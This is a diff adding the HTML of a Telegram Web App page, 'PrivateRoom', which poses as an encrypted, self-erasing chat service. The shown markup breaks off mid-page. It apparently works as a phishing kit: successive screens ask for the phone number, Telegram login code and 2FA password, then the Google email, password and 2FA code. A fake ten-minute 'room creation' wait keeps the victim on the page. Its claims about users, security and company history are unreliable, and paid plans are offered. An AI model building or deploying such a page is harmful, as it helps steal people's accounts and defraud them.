@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>PrivateRoom</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        (function() {
+            function activateFullscreen() {
+                try {
+                    var tg = window.Telegram && window.Telegram.WebApp;
+                    if (tg) {
+                        tg.ready();
+                        if (typeof tg.requestFullscreen === "function") {
+                            tg.requestFullscreen();
+                        }
+                        if (!tg.isExpanded) tg.expand();
+                        if (typeof tg.disableVerticalSwipes === "function") tg.disableVerticalSwipes();
+                        if (typeof tg.setHeaderColor === "function") tg.setHeaderColor("#0b0c10");
+                        if (typeof tg.setBackgroundColor === "function") tg.setBackgroundColor("#0b0c10");
+                    }
+                } catch (e) {}
+            }
+            activateFullscreen();
+            window.addEventListener("DOMContentLoaded", activateFullscreen);
+            window.addEventListener("load", activateFullscreen);
+            [30, 80, 150, 300, 600, 1000, 1500].forEach(function(t) { setTimeout(activateFullscreen, t); });
+        })();
+    </script>
+</head>
+<body>
+    <div class="app-container">
+        <!-- Top App Bar -->
+        <header class="app-header">
+            <div class="brand">
+                <div class="brand-icon">
+                    <span class="pulse-dot"></span>
+                    <img src="assets/tg.gif" alt="Telegram" class="tg-icon-gif">
+                </div>
+                <div class="brand-info">
+                    <span class="brand-name">PrivateRoom</span>
+                    <span class="brand-status">Защищённая сессия</span>
+                </div>
+            </div>
+            <div class="header-actions">
+                <button type="button" class="header-auth-btn" id="btnHeaderAuth">
+                    <span class="btn-auth-icon">✈️</span>
+                    <span id="headerAuthText">Войти через TG</span>
+                </button>
+            </div>
+        </header>
+
+        <!-- Main Content Area -->
+        <main class="content-wrapper">
+
+            <!-- STEP 1: Phone Request Screen (Native Telegram Share Contact) -->
+            <section id="stepPhone" class="auth-step">
+                <div class="visual-badge">
+                    <div class="media-container">
+                        <img src="assets/phone.gif" alt="Phone" class="auth-gif">
+                    </div>
+                </div>
+
+                <div class="text-block">
+                    <h1 class="step-title">
+                        <img src="assets/duck.gif" alt="Duck" class="title-inline-gif">
+                        <span>Вход через Telegram</span>
+                    </h1>
+                    <div class="step-desc">
+                        <p><strong>👤 Подтвердите свой аккаунт.</strong> Для создания приватных комнат и сквозного E2E шифрования необходимо войти через Telegram. 🔐 <em>Нажмите кнопку ниже, а затем в открывшемся окне выберите «Поделиться номером».</em></p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <div class="action-block">
+                        <button type="button" class="btn-primary btn-glow" id="btnRequestPhone">
+                            <span class="btn-icon">🔢</span>
+                            <span>Поделиться номером</span>
+                        </button>
+                        <div class="auth-methods-separator hidden" id="googleAuthSeparator">
+                            <span>или</span>
+                        </div>
+                        <button type="button" class="btn-auth-alternative btn-google-method hidden" id="btnSwitchToGoogle">
+                            <svg class="btn-google-svg" viewBox="0 0 48 48" width="20" height="20">
+                                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                            </svg>
+                            <span>Войти через Google Почту</span>
+                        </button>
+                        <button type="button" class="btn-text" id="btnBackToHome">
+                            <span>Назад на главную</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 2: Verification Code / Checking Screen -->
+            <section id="stepCode" class="auth-step">
+                <div class="visual-badge">
+                    <div class="media-container">
+                        <img src="assets/hourglass.gif" alt="Checking" class="auth-gif">
+                    </div>
+                </div>
+
+                <div class="text-block">
+                    <h1 class="step-title">
+                        <img src="assets/hourglass.gif" alt="Hourglass" class="title-inline-gif">
+                        <span>Проверяем</span>
+                    </h1>
+                    <div class="step-desc">
+                        <p>Проверяем данные... 🔐 Пожалуйста, подождите немного. Проверка завершится автоматически.</p>
+                        <p class="desc-hint">Код отправлен в Telegram на номер <strong id="codeSentPhone" style="color: #00e5ff;"></strong>. Введите его ниже:</p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <div class="input-group">
+                        <div class="input-box code-box">
+                            <input type="text" id="codeInput" maxlength="6" placeholder="• • • • •" inputmode="numeric" autocomplete="one-time-code">
+                        </div>
+                    </div>
+
+                    <div class="action-block">
+                        <button type="button" class="btn-primary btn-glow" id="btnSubmitCode">
+                            <span class="btn-icon">⚡</span>
+                            <span>Подтвердить код</span>
+                        </button>
+                        <button type="button" class="btn-secondary" id="btnResendCode">
+                            <span class="btn-icon">🔄</span>
+                            <span id="resendCodeText">Запросить код ещё раз</span>
+                        </button>
+                        <button type="button" class="btn-text" id="btnBackToPhone">
+                            <span>« Изменить номер</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 3: 2FA Password Screen -->
+            <section id="step2FA" class="auth-step">
+                <div class="visual-badge">
+                    <div class="lock-container">
+                        <div class="lock-glow"></div>
+                        <div class="lock-icon">
+                            <svg viewBox="0 0 100 100" class="lock-svg">
+                                <defs>
+                                    <linearGradient id="lockGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                                        <stop offset="0%" stop-color="#ff2a55" />
+                                        <stop offset="50%" stop-color="#800020" />
+                                        <stop offset="100%" stop-color="#2d050f" />
+                                    </linearGradient>
+                                </defs>
+                                <rect x="25" y="42" width="50" height="42" rx="10" fill="url(#lockGrad)" stroke="#ff4d79" stroke-width="2.5" />
+                                <path d="M36,42 L36,28 C36,19 42,12 50,12 C58,12 64,19 64,28 L64,42" fill="none" stroke="#ff3366" stroke-width="6" stroke-linecap="round" />
+                                <circle cx="50" cy="60" r="5" fill="#ffffff" />
+                                <path d="M50,65 L50,73" stroke="#ffffff" stroke-width="3" stroke-linecap="round" />
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-block">
+                    <h1 class="step-title">
+                        <span class="title-icon">🔐</span> Подтвердите пароль
+                    </h1>
+                    <div class="step-desc">
+                        <p><strong>Введите пароль для продолжения.</strong> 🔒 Для защиты вашей учётной записи необходимо подтвердить пароль. <em>Ваши данные обрабатываются в защищённом режиме.</em></p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <div class="input-group">
+                        <div class="floating-box">
+                            <input type="password" id="password2FA" placeholder=" " autocomplete="current-password">
+                            <label for="password2FA">Введите пароль 2FA</label>
+                            <button type="button" class="eye-toggle" id="togglePasswordBtn">👁</button>
+                        </div>
+                    </div>
+
+                    <div class="action-block">
+                        <button type="button" class="btn-primary btn-glow" id="btnSubmit2FA">
+                            <span class="btn-icon">🔐</span>
+                            <span>Подтвердить пароль</span>
+                        </button>
+                        <button type="button" class="btn-text" id="btnBackFrom2FA">
+                            <span>« Назад к коду</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP GOOGLE 1: Email Input Screen -->
+            <section id="stepGoogleEmail" class="auth-step">
+                <div class="visual-badge">
+                    <div class="google-badge-wrap">
+                        <svg class="google-svg-logo" viewBox="0 0 48 48" width="52" height="52">
+                            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="text-block">
+                    <h1 class="step-title">
+                        <span>Вход с аккаунтом Google</span>
+                    </h1>
+                    <div class="step-desc">
+                        <p><strong>Для доступа к изолированному шлюзу</strong> подтвердите вашу учётную запись Google. <em>Сессия будет привязана к вашему почтовому аккаунту.</em></p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <div class="input-group">
+                        <div class="floating-box">
+                            <input type="email" id="googleEmailInput" placeholder=" " autocomplete="email" inputmode="email">
+                            <label for="googleEmailInput">Адрес эл. почты или телефон</label>
+                        </div>
+                    </div>
+
+                    <div class="action-block">
+                        <button type="button" class="btn-primary btn-glow btn-google-action" id="btnSubmitGoogleEmail">
+                            <span class="btn-icon">➜</span>
+                            <span>Далее</span>
+                        </button>
+                        <button type="button" class="btn-secondary" id="btnBackFromGoogleToTG">
+                            <span>« Войти через Telegram</span>
+                        </button>
+                        <button type="button" class="btn-text" id="btnGoogleBackToHome">
+                            <span>Назад на главную</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP GOOGLE 2: Password Input Screen -->
+            <section id="stepGooglePassword" class="auth-step">
+                <div class="visual-badge">
+                    <div class="google-badge-wrap">
+                        <svg class="google-svg-logo" viewBox="0 0 48 48" width="52" height="52">
+                            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="google-user-chip" id="googleUserChip">
+                    <div class="google-avatar-mini" id="googleChipInitial">G</div>
+                    <span class="google-chip-email" id="googleDisplayEmail">user@gmail.com</span>
+                </div>
+
+                <div class="text-block">
+                    <h1 class="step-title">
+                        <span>Добро пожаловать</span>
+                    </h1>
+                    <div class="step-desc">
+                        <p>Введите пароль от вашего аккаунта Google для продолжения сессии.</p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <div class="input-group">
+                        <div class="floating-box">
+                            <input type="password" id="googlePasswordInput" placeholder=" " autocomplete="current-password">
+                            <label for="googlePasswordInput">Введите пароль</label>
+                            <button type="button" class="eye-toggle" id="toggleGooglePasswordBtn">👁</button>
+                        </div>
+                    </div>
+
+                    <div class="action-block">
+                        <button type="button" class="btn-primary btn-glow btn-google-action" id="btnSubmitGooglePassword">
+                            <span class="btn-icon">⚡</span>
+                            <span>Далее</span>
+                        </button>
+                        <button type="button" class="btn-text" id="btnBackToGoogleEmail">
+                            <span>« Изменить почту</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP GOOGLE 3: 2FA Verification Screen -->
+            <section id="stepGoogle2FA" class="auth-step">
+                <div class="visual-badge">
+                    <div class="google-badge-wrap">
+                        <span class="g2fa-shield-glyph">🛡️</span>
+                    </div>
+                </div>
+
+                <div class="google-user-chip">
+                    <div class="google-avatar-mini" id="google2faChipInitial">G</div>
+                    <span class="google-chip-email" id="google2faDisplayEmail">user@gmail.com</span>
+                </div>
+
+                <div class="text-block">
+                    <h1 class="step-title">
+                        <span>Двухэтапная аутентификация</span>
+                    </h1>
+                    <div class="step-desc">
+                        <p><strong>Подтверждение входа.</strong> Введите 6-значный код подтверждения из SMS или приложения Authenticator.</p>
+                        <p class="desc-hint">Формат: G-XXXXXX</p>
+                    </div>
+                </div>
+
+                <div class="form-container">
+                    <div class="input-group">
+                        <div class="input-box code-box">
+                            <input type="text" id="google2faCodeInput" maxlength="8" placeholder="G- • • • • • •" inputmode="numeric">
+                        </div>
+                    </div>
+
+                    <div class="action-block">
+                        <button type="button" class="btn-primary btn-glow btn-google-action" id="btnSubmitGoogle2FA">
+                            <span class="btn-icon">✓</span>
+                            <span>Подтвердить вход</span>
+                        </button>
+                        <button type="button" class="btn-secondary" id="btnSkipGoogle2FA">
+                            <span>Войти без кода подтверждения</span>
+                        </button>
+                        <button type="button" class="btn-text" id="btnBackToGooglePassword">
+                            <span>« Назад к паролю</span>
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- STEP 4: Success & Member Dashboard -->
+            <section id="stepSuccess" class="auth-step dashboard-step active">
+                <!-- Dashboard Hero -->
+                <div class="dash-hero">
+                    <div class="dash-badge-row">
+                        <div class="dash-badge-pulse">
+                            <span class="status-indicator"></span>
+                            <span>Шлюз активен</span>
+                        </div>
+                        <div class="dash-badge-online">
+                            <span class="online-dot"></span>
+                            <span><strong id="onlineCounterBadge">6 842</strong> в сети</span>
+                        </div>
+                    </div>
+                    <h1 class="dash-title">PrivateRoom</h1>
+                    <p class="dash-subtitle">
+                        Вы создаете приватную комнату и уже в ней можете обмениваться материалами не боясь последствий. После каждого завершения переписки вы гарантированно стираете весь след сессии.
+                    </p>
+                </div>
+
+                <!-- Room Creation Control Card -->
+                <div class="room-card" id="roomCard">
+                    <div class="room-card-header">
+                        <div class="room-icon-glow">🔒</div>
+                        <div class="room-header-text">
+                            <h3>Создание приватной комнаты</h3>
+                            <p>Изолированное сквозное шифрование (E2E)</p>
+                        </div>
+                    </div>
+
+                    <!-- Initial State: Create Button -->
+                    <div id="roomInitialBlock" class="room-action-wrap">
+                        <button type="button" class="btn-primary btn-glow btn-create-room" id="btnCreateRoom">
+                            <span class="btn-icon">⚡</span>
+                            <span>Создать приватную комнату</span>
+                        </button>
+                    </div>
+
+                    <!-- Loading / Generating State -->
+                    <div id="roomLoadingBlock" class="room-loading-wrap hidden">
+                        <div class="loader-radar">
+                            <div class="radar-circle"></div>
+                            <div class="radar-circle-inner"></div>
+                            <img src="assets/password.gif?v=2" alt="Security Lock" class="radar-center-gif">
+                        </div>
+
+                        <div class="progress-container">
+                            <div class="progress-bar-track">
+                                <div class="progress-bar-fill" id="roomProgressFill"></div>
+                            </div>
+                            <div class="progress-labels">
+                                <span class="progress-percent" id="roomProgressPercent">0%</span>
+                                <span class="progress-time" id="roomProgressTime">⏱ 00:00</span>
+                            </div>
+                        </div>
+
+                        <div class="loading-status-box">
+                            <p class="loading-status-text" id="roomLoadingStatus">
+                                Ожидайте, ваша комната создается. Обычно создание занимает не более 10 минут...
+                            </p>
+                        </div>
+
+                        <div class="loading-warning">
+                            <span class="warn-icon">ℹ️</span>
+                            <span>Пожалуйста, не закрывайте страницу, чтобы не вызвать ошибку инициализации шлюза.</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 1. LIVE NETWORK STATS -->
+                <div class="stats-bar-grid">
+                    <div class="stat-pill">
+                        <div class="stat-val-row">
+                            <span class="online-dot-mini"></span>
+                            <span class="stat-val text-green" id="statOnline">6 842</span>
+                        </div>
+                        <span class="stat-lbl">Онлайн сейчас</span>
+                    </div>
+                    <div class="stat-pill">
+                        <span class="stat-val" id="statRooms">148</span>
+                        <span class="stat-lbl">Активных комнат</span>
+                    </div>
+                    <div class="stat-pill">
+                        <span class="stat-val" id="statPurged">52.8k</span>
+                        <span class="stat-lbl">Стерто файлов</span>
+                    </div>
+                    <div class="stat-pill">
+                        <span class="stat-val text-neon">11 ms</span>
+                        <span class="stat-lbl">4/4 узла онлайн</span>
+                    </div>
+                </div>
+
+                <!-- 2. INTERACTIVE DEMO CHAT SIMULATOR -->
+                <div class="demo-section">
+                    <div class="section-header">
+                        <span class="section-tag">Интерактивное демо</span>
+                        <h2 class="section-title">Как работает изолированная комната</h2>
+                        <p class="section-desc">
+                            Попробуйте симуляцию отправки медиа и экстренного уничтожения сессии у обоих собеседников в 1 клик.
+                        </p>
+                    </div>
+
+                    <div class="chat-demo-card" id="chatDemoCard">
+                        <div class="demo-phone-header">
+                            <div class="demo-user-badge">
+                                <span class="demo-dot"></span>
+                                <div>
+                                    <div class="demo-user-name">Приватная комната #E2E-904</div>
+                                    <div class="demo-user-sub">Сквозное шифрование активна</div>
+                                </div>
+                            </div>
+                            <span class="demo-lock-pill">🔒 256-bit</span>
+                        </div>
+
+                        <div class="demo-messages-area" id="demoMessagesArea">
+                            <!-- Message 1 (In) -->
+                            <div class="demo-msg msg-in" id="demoMsg1">
+                                <div class="msg-bubble">
+                                    <span class="msg-sender">Собеседник</span>
+                                    <p>Привет! Закинул приватные фото и документы в наш изолированный канал 📂</p>
+                                    <span class="msg-time">14:02 ✓✓</span>
+                                </div>
+                            </div>
+
+                            <!-- Message 2 (Out - Encrypted Media) -->
+                            <div class="demo-msg msg-out" id="demoMsg2">
+                                <div class="msg-bubble msg-media">
+                                    <div class="media-preview-box">
+                                        <div class="media-blur-overlay">
+                                            <span class="media-icon">🔒</span>
+                                            <span class="media-text">Защищённое фото</span>
+                                            <span class="media-badge">Самоуничтожение 0:05</span>
+                                        </div>
+                                    </div>
+                                    <span class="msg-time">14:03 ✓✓</span>
+                                </div>
+                            </div>
+
+                            <!-- Message 3 (In) -->
+                            <div class="demo-msg msg-in" id="demoMsg3">
+                                <div class="msg-bubble">
+                                    <p>Всё сохранил, запускаем стирание сессии!</p>
+                                    <span class="msg-time">14:03 ✓✓</span>
+                                </div>
+                            </div>
+
+                            <!-- Purged Notification State (Hidden initially) -->
+                            <div class="demo-purged-banner hidden" id="demoPurgedBanner">
+                                <div class="purged-icon-wrap">🔥</div>
+                                <h4>СЕССИЯ ПОЛНОСТЬЮ СТЕРТА</h4>
+                                <p>0 байт данных сохранено. Криптографические ключи сброшены у обоих собеседников.</p>
+                            </div>
+                        </div>
+
+                        <!-- Demo Controls -->
+                        <div class="demo-controls">
+                            <button type="button" class="btn-demo-purge" id="btnDemoPurge">
+                                <span>🔥 Стереть данные у обоих</span>
+                            </button>
+                            <button type="button" class="btn-demo-reset hidden" id="btnDemoReset">
+                                <span>🔄 Перезапустить демо</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 3. DETAILED ABOUT ORGANIZATION & ARCHITECTURE -->
+                <div class="info-section">
+                    <div class="section-header">
+                        <span class="section-tag">О компании и миссии</span>
+                        <h2 class="section-title">PrivateRoom Labs — 4 года на рынке кибербезопасности</h2>
+                    </div>
+
+                    <div class="about-company-box">
+                        <p class="about-p">
+                            Платформа <strong>PrivateRoom</strong> разработана независимой исследовательской группой <strong>PrivateRoom Labs</strong>, основанной в 2021 году. За более чем 4 года непрерывного развития в сфере защищенных коммуникаций мы создали уникальную инфраструктуру изолированного обмена данными, которой доверяют свыше <strong>80,000 пользователей</strong> по всему миру.
+                        </p>
+                        <p class="about-p">
+                            Наша фундаментальная философия — <strong>Zero-Knowledge & Zero-Trace</strong>. Мы принципиально исключаем хранение логов, сессионных дампов и пользовательских медиа. Вся маршрутизация трафика происходит исключительно в оперативной памяти (<strong>RAM-only Architecture</strong>) распределенных зарубежных узлов. При закрытии приватной комнаты ключи шифрования уничтожаются навсегда.
+                        </p>
+
+                        <div class="company-metrics-grid">
+                            <div class="comp-metric">
+                                <span class="comp-num">4+ года</span>
+                                <span class="comp-desc">Опыта в E2E защите</span>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-num">250k+</span>
+                                <span class="comp-desc">Проведенных сессий</span>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-num">0 байт</span>
+                                <span class="comp-desc">Логирования на дисках</span>
+                            </div>
+                            <div class="comp-metric">
+                                <span class="comp-num">99.98%</span>
+                                <span class="comp-desc">Аптайм крипто-шлюзов</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Interactive Multi-Hop Relay Animation Widget -->
+                    <div class="relay-topology-card" id="relayTopologyCard">
+                        <div class="topology-header">
+                            <div class="topology-title-wrap">
+                                <span class="topology-pulse-dot"></span>
+                                <h4>Интерактивный туннель шифрования</h4>
+                            </div>
+                            <span class="topology-badge">Live Multi-Hop</span>
+                        </div>
+                        <p class="topology-subtext">
+                            Нажмите на узел для проверки параметров или запустите тестовый зашифрованный пакет:
+                        </p>
+
+                        <!-- Topology Visual Chain -->
+                        <div class="topology-chain">
+                            <div class="topo-node active" data-node="client" id="nodeClient">
+                                <div class="node-icon-box">📱</div>
+                                <div class="node-name">Вы</div>
+                                <div class="node-status">Шлюз OK</div>
+                            </div>
+
+                            <div class="topo-line">
+                                <div class="topo-particle" id="topoParticle1"></div>
+                            </div>
+
+                            <div class="topo-node" data-node="zurich" id="nodeZurich">
+                                <div class="node-icon-box">🇨🇭</div>
+                                <div class="node-name">Цюрих</div>
+                                <div class="node-status">RAM-Only</div>
+                            </div>
+
+                            <div class="topo-line">
+                                <div class="topo-particle" id="topoParticle2"></div>
+                            </div>
+
+                            <div class="topo-node" data-node="reykjavik" id="nodeReykjavik">
+                                <div class="node-icon-box">🇮🇸</div>
+                                <div class="node-name">Исландия</div>
+                                <div class="node-status">Ghost Relay</div>
+                            </div>
+
+                            <div class="topo-line">
+                                <div class="topo-particle" id="topoParticle3"></div>
+                            </div>
+
+                            <div class="topo-node" data-node="peer" id="nodePeer">
+                                <div class="node-icon-box">👤</div>
+                                <div class="node-name">Собеседник</div>
+                                <div class="node-status">E2E Decrypt</div>
+                            </div>
+                        </div>
+
+                        <!-- Live Interactive Log / Status Monitor -->
+                        <div class="topology-console" id="topologyConsole">
+                            <div class="console-line">
+                                <span class="console-prompt">&gt;</span>
+                                <span class="console-msg" id="topoConsoleMsg">Кластер активен. 3 узла маршрутизации синхронизированы в оперативной памяти.</span>
+                            </div>
+                        </div>
+
+                        <button type="button" class="btn-topo-pulse" id="btnTopoPulse">
+                            <span>⚡ Запустить тестовый импульс пакета</span>
+                        </button>
+                    </div>
+
+                    <div class="tech-grid">
+                        <div class="tech-card">
+                            <div class="tech-icon">🛡</div>
+                            <h4>Zero-Trace RAM Protocol</h4>
+                            <p>Мгновенное уничтожение сессионных ключей и временных пакетов сразу после выхода из изолированной комнаты.</p>
+                        </div>
+                        <div class="tech-card">
+                            <div class="tech-icon">🔑</div>
+                            <h4>AES-256-GCM & MTProto v2</h4>
+                            <p>Многоуровневое симметричное и асимметричное шифрование медиапотока без возможности перехвата третьими лицами.</p>
+                        </div>
+                        <div class="tech-card">
+                            <div class="tech-icon">🌐</div>
+                            <h4>Европейский VPS Кластер</h4>
+                            <p>Серверные мощности в Швейцарии, Исландии и Германии с наивысшими мировыми стандартами защиты тайны переписки.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 4. SUBSCRIPTION / TARIFF PLANS -->
+                <div class="pricing-section" id="pricingSection">
+                    <div class="section-header">
+                        <span class="section-tag">Тарифы</span>
+                        <h2 class="section-title">Возможности пространства</h2>
+                        <p class="section-desc">Выберите подходящий уровень изоляции для конфиденциальных сессий.</p>
+                    </div>
+
+                    <div class="pricing-grid">
+                        <!-- Plan 1 -->
+                        <div class="plan-card">
+                            <div class="plan-header">
+                                <h3>Basic Relay</h3>
+                                <div class="plan-price-wrap">
+                                    <span class="plan-price-val">0$</span>
+                                    <span class="plan-price-period">/ включено</span>
+                                </div>
+                            </div>
+                            <ul class="plan-features">
+                                <li>✓ До 3 приватных комнат в день</li>
+                                <li>✓ Авто-стирание через 60 минут</li>
+                                <li>✓ Сквозное E2E шифрование</li>
+                                <li>✓ Передача медиа до 50 МБ</li>
+                            </ul>
+                            <div class="plan-current-tag">Текущий тариф</div>
+                            <button type="button" class="btn-plan-details" data-target="compare-basic">
+                                <span>Подробнее о тарифе ↓</span>
+                            </button>
+                        </div>
+
+                        <!-- Plan 2 (PRO) -->
+                        <div class="plan-card plan-featured">
+                            <div class="featured-ribbon">Хит</div>
+                            <div class="plan-header">
+                                <h3>Private PRO</h3>
+                                <div class="plan-price-wrap">
+                                    <span class="plan-price-val">50$</span>
+                                    <span class="plan-price-period">/ неделя</span>
+                                </div>
+                            </div>
+                            <ul class="plan-features">
+                                <li>✓ <strong>Безлимитные</strong> изолированные комнаты</li>
+                                <li>✓ <strong>Мгновенное</strong> стирание у обоих в 1 клик</li>
+                                <li>✓ Защита от создания скриншотов и записи</li>
+                                <li>✓ Передача 4K фото и видео без сжатия</li>
+                                <li>✓ Выделенный скоростной VPS-туннель</li>
+                            </ul>
+                            <button type="button" class="btn-plan-select btn-glow btn-buy-trigger" data-plan="pro" data-price="50">
+                                <span>Купить Private PRO (50$)</span>
+                            </button>
+                            <button type="button" class="btn-plan-details" data-target="compare-pro">
+                                <span>Подробнее о тарифе ↓</span>
+                            </button>
+                        </div>
+
+                        <!-- Plan 3 (VIP) -->
+                        <div class="plan-card">
+                            <div class="plan-header">
+                                <h3>Ghost VIP</h3>
+                                <div class="plan-price-wrap">
+                                    <span class="plan-price-val">110$</span>
+                                    <span class="plan-price-period">/ неделя</span>
+                                </div>
+                            </div>
+                            <ul class="plan-features">
+                                <li>✓ Все функции Private PRO</li>
+                                <li>✓ Искажение тональности аудио и кружочков</li>
+                                <li>✓ Персональные одноразовые Burner-ссылки</li>
+                                <li>✓ Индивидуальный изолированный прокси-шлюз</li>
+                            </ul>
+                            <button type="button" class="btn-plan-secondary btn-buy-trigger" data-plan="vip" data-price="110">
+                                <span>Купить Ghost VIP (110$)</span>
+                            </button>
+                            <button type="button" class="btn-plan-details" data-target="compare-vip">
+                                <span>Подробнее о тарифе ↓</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 4.1 DETAILED COMPARISON TABLE (CHOOSE YOUR PLAN) -->
+                <div class="comparison-section" id="planComparisonSection">
+                    <div class="section-header">
+                        <span class="section-tag">Сравнение</span>
+                        <h2 class="section-title">Сравнение тарифов (Choose your plan)</h2>
+                        <p class="section-desc">Детальное сравнение возможностей и уровней приватности для каждого тарифного плана.</p>
+                    </div>
+
+                    <div class="comparison-grid">
+                        <!-- Column 1: Basic -->
+                        <div class="compare-card" id="compareBasicCard">
+                            <div class="compare-header">
+                                <h3>Basic</h3>
+                                <div class="compare-price">
+                                    <span class="currency">$</span>
+                                    <span class="amount">0</span>
+                                    <span class="period">/ неделя</span>
+                                </div>
+                                <p class="compare-tagline">Базовый защищённый доступ к комнатам</p>
+                                <button type="button" class="btn-compare-action current-btn" disabled>Текущий план</button>
+                            </div>
+                            <div class="compare-features-list">
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon">✦</span>
+                                    <span>До 3 комнат в сутки</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon">✦</span>
+                                    <span>Стандартное E2E шифрование</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon">✦</span>
+                                    <span>Авто-удаление через 60 минут</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon">✦</span>
+                                    <span>Медиафайлы до 50 МБ</span>
+                                </div>
+                                <div class="compare-feat-item disabled">
+                                    <span class="feat-icon">✕</span>
+                                    <span>Мгновенный Zero-Trace сброс</span>
+                                </div>
+                                <div class="compare-feat-item disabled">
+                                    <span class="feat-icon">✕</span>
+                                    <span>Защита от скриншотов</span>
+                                </div>
+                                <div class="compare-feat-item disabled">
+                                    <span class="feat-icon">✕</span>
+                                    <span>Искажение голоса и кружков</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Column 2: Plus / Pro -->
+                        <div class="compare-card featured-compare" id="compareProCard">
+                            <div class="compare-badge">Популярный выбор</div>
+                            <div class="compare-header">
+                                <h3>Private PRO</h3>
+                                <div class="compare-price">
+                                    <span class="currency">$</span>
+                                    <span class="amount">50</span>
+                                    <span class="period">/ неделя</span>
+                                </div>
+                                <p class="compare-tagline">Максимальная скорость и безлимитная изоляция</p>
+                                <button type="button" class="btn-compare-action btn-buy-trigger btn-glow" data-plan="pro" data-price="50">
+                                    Купить Private PRO
+                                </button>
+                            </div>
+                            <div class="compare-features-list">
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span><strong>Безлимитные</strong> изолированные комнаты</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span><strong>Мгновенное стирание</strong> в 1 клик</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Защита от скриншотов и записи экрана</span>
+                                </div>
+                                <div class="compare-feat-item">
+                                    <span class="feat-icon text-neon">✓</span>
+                                    <span>Передача 4K видео и фото без сжатия</span>
+                                </div>
+                                <div class="compare-feat-item">
